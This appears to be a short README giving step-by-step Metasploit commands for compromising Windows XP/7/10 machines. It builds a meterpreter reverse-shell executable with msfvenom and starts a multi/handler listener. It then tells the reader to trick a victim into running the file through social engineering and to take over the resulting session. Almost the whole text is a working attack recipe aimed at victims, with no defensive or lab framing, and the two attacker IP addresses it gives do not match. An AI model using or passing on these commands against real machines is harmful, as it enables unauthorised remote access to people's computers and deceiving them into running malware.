# system_hacking-windows-XP-7-10-
Step-by-step commands for hacking into windows XP/7/10 using **Metasploit Framework**

### Command to create an exploit:
`msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.23.160 -f exe -o /home/yash/Desktop/Exploit.exe`

Then open MSF: `msfconsole`

`msf6 > use exploit/multi/handler`

`msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp`

*Select the same payload of which we have created the exploit*

`msf6 exploit(multi/handler) > set LHOST 192.168.1.12`

*192.168.1.12 -> IP address of the attacker's machine*

`msf6 exploit(multi/handler) > exploit -j -z`

*Now send the exploit to the victim using social engineering skills, then wait for the victim to click on the exploit, once the expoit is run in the victims machine you will get a session on the msf6>*

`msf6 exploit(multi/handler) > sessions -i 1`

*Now you will get the session*

*Congratulations!!*
